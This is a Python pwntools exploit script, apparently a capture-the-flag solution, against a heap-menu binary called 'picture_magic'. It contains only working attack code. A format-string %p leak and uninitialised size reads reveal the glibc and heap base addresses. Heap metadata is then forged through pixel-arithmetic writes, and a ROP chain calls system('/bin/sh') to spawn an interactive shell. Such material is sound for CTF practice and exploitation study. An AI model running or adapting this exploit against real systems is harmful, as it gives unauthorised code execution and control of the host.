#!/usr/bin/env python3

from ast import literal_eval
from pwn import context, ELF, p32, p64, remote, ROP, sys

context.binary = 'picture_magic'
glibc = ELF('libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)


def create(width: int, height: int, data: bytes = b'') -> int:
    p.sendlineafter(b'-> ', b'1')
    p.sendlineafter(b'Width: ', str(width).encode())
    p.sendlineafter(b'Height: ', str(height).encode())
    p.sendlineafter(b'================================\n', data)
    p.recvuntil(b'Picture has been assigned index ')
    return int(p.recvuntil(b'.', drop=True).decode())


def transform(index: int, size: int, row: int, column: int, operation: bytes):
    p.sendlineafter(b'-> ', b'2')
    p.sendlineafter(b'Picture index: ', str(index).encode())
    p.sendlineafter(b'Transformation type (mul/add/sub/div): ', operation)
    p.sendlineafter(b'Transformation size: ', str(size).encode())
    p.sendlineafter(b'Transformation row (-1 for all): ', str(row).encode())
    p.sendlineafter(b'Transformation column (-1 for all): ',
                    str(column).encode())


def show(index: int) -> bytes:
    p.sendlineafter(b'-> ', b'3')
    p.sendlineafter(b'Picture index: ', str(index).encode())
    p.recvuntil(b'================================\n')
    return p.recvuntil(b'================================\n', drop=True)


def sell(index: int, price: bytes = b'0', yn: bytes = b'y') -> bytes:
    p.sendlineafter(b'-> ', b'4')
    p.sendlineafter(b'Picture index: ', str(index).encode())
    p.sendlineafter(b'How much do you want to sell the picture for? ', price)

    if price == b'0':
        return b''

    p.recvuntil(b'Picture is put up for sale at the price of $')
    sale = p.recvuntil(b'.', drop=True)
    p.sendlineafter(b'Do you want to throw it away instead? (y/N) ', yn)
    return sale


def change(name: bytes):
    p.sendlineafter(b'-> ', b'5')
    p.sendlineafter(b'New artist name: ', name)


def write_byte(b: int, index: int, column: int):
    transform(index, 0, 0, column, b'mul')
    transform(index, abs(b - 0x20), 0, column, b'add' if b > 0x20 else b'sub')


def write_qword(qword: bytes, offset: int, index: int):
    for i, b in enumerate(qword):
        if b:
            write_byte(b, index, offset - (8 - i))


def main():
    p.sendlineafter(b'Before creating your masterpiece, please enter your artist name:', b'asdf')

    create(0, 0)
    create(0, 0)
    create(0, 0)
    create(0, 0)

    name_addr = int(sell(0, b'%p').decode(), 16) + 0x2160
    p.info(f'Name address: {hex(name_addr)}')

    sell(2)
    sell(3)

    p.sendlineafter(b'-> ', b'1')
    p.sendlineafter(b'Width: ', b'asdf')
    p.sendlineafter(b'Height: ', b'asdf')
    p.recvuntil(b'Chosen size of ')
    width, height = literal_eval(p.recvuntil(b')').decode())
    glibc.address = ((height << 32) | width) - 0x1f6cc0
    p.success(f'Glibc base address: {hex(glibc.address)}')

    create(0, 0)

    p.sendlineafter(b'-> ', b'1')
    p.sendlineafter(b'Width: ', b'asdf')
    p.sendlineafter(b'Height: ', b'asdf')
    p.recvuntil(b'Chosen size of ')
    width, height = literal_eval(p.recvuntil(b')').decode())
    heap_base_addr = ((height << 32) | width) - 0x290
    p.success(f'Heap base address: {hex(heap_base_addr)}')

    sell(0)
    sell(1)

    create(0, 0)
    create(0, 0)

    sell(0)
    create(0x4f0, 1)

    two_c = lambda n: ((~(abs(n)) + 1) & 0xffffffffffffffff)

    prev_size = two_c(heap_base_addr + 0x790 - name_addr)
    write_qword(p64(prev_size), 0x4f0, 0)

    change(p64(0) + p64(prev_size) + p64(name_addr) * 4)

    sell(1)

    change(p64(0) + p64(0x20371))

    index = create(0, 0)
    change(p64(0) + p64(0x501) + p32(0xffffffff) + p32(1))

    rop = ROP(glibc)

    write_qword(p64(rop.ret.address), 56, index)
    write_qword(p64(rop.rdi.address), 64, index)
    write_qword(p64(next(glibc.search(b'/bin/sh'))), 72, index)
    write_qword(p64(glibc.sym.system), 80, index)

    p.sendlineafter(b'-> ', b'6')
    p.recv()

    p.interactive()


if __name__ == '__main__':
    p = get_process()
    main()
